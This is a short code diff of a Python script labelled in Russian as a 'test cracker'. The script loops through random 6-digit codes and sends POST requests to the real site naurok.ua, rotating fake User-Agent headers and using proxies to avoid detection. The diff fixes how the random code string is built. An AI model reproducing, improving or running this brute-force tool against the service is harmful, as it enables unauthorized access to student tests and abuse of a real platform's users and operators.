@@ -14,7 +14,7 @@ console.print('''взломщик тестов
 for _ in track(range(999)):
     kod = ''
     for i in range(6):
-         kod = str(random.randint(0, 9) + kod) 
+         kod = str(random.choice('1234567890') + kod) 
          headers = {"UserAgent": fake_useragent.UserAgent().random}
          try:
             requests.post("https://naurok.ua/student/tests", json={"login": "+" + number}, headers=headers, proxies=proxies)
